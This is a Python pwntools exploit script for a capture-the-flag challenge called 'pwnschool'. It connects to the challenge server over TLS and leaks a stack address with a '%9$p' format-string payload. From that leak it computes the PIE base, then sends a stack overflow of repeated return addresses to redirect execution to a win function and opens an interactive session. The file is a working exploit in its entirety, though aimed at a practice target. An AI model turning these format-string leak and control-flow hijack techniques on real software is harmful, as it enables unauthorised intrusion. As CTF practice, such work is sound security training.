#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        #log_level="debug",
        log_level="info",
        os="linux",
        terminal=["tmux", "split-window", "-h", "-p 65"]
        #terminal=["st"]
)
to = 2

ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)

def start(binary):
    return remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")
    

def exploit():

    p = remote("spaceheroes-pwnschool.chals.io", 443, ssl=True, sni="spaceheroes-pwnschool.chals.io")

    p.recvuntil(b"Enter choice >>> ") 
    p.sendline(b"1")
    p.sendline(b"A"*20)

    p.recvuntil(b"Enter choice >>> ") 
    p.sendline(b"2")
    p.sendline(b"%9$p")

    p.recvuntil(b"function we are in now:")
    addr = int(p.recvline().split(b".")[0],16)
    pie_base = addr - 0x1380
    log.info(f"Leaked PIE Base {hex(pie_base)}")
    win_addr = pie_base + 0x2139
    ret = win_addr - 1 

    p.recvuntil(b"Enter choice >>> ") 
    p.sendline(b"3")
    p.sendline(hex(win_addr))
    


    p.recvuntil(b"Enter choice >>> ") 
    p.sendline(b"4")
    p.sendline(p64(ret) * 6 + p64(win_addr))

    p.interactive()
    

if __name__=="__main__":

    exploit()
